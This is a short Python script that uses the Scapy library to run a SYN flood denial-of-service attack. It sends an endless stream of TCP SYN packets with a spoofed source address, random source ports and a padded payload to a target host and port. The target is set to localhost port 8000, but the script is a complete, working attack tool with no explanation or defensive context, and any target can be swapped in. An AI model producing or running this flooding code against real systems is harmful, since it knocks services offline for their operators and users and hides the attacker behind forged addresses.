from scapy.all import IP, TCP, Raw, send
import random

target_ip = "127.0.0.1"
target_port = 8000
fake_source_ip = "10.0.0.1"

def syn_flood(target_ip, target_port, fake_source_ip):
    ip = IP(src=fake_source_ip, dst=target_ip)
    while True:
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        raw = Raw(b"X"*1024)
        pkt = ip / tcp / raw
        send(pkt, verbose=0)

try:
    syn_flood(target_ip, target_port, fake_source_ip)
except Exception as e:
    print(f"An error occurred: {e}")